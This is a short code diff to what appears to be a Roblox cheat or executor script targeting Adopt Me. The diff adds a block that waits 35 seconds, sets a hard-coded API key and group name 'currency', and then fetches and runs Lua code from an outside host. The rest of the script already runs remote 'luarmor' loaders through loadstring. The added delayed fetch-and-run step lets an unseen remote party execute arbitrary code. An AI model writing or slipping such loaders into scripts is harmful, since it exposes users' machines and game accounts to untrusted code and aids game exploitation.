@@ -1,4 +1,12 @@
 task.spawn(function()
+    task.wait(35)
+    getgenv().API_KEY = "En0qsIBEECaHRJQ7HYVAvsyqL"
+    getgenv().GroupName = "currency"
+    loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
+end)
+
+task.spawn(function()
+task.spawn(function()
     loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
 end)
 task.spawn(function()
@@ -6,3 +14,4 @@ task.spawn(function()
     loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/8da37cc5a500e906eb433cec962f9be7.lua"))()
 end)
 print("done")
+end)
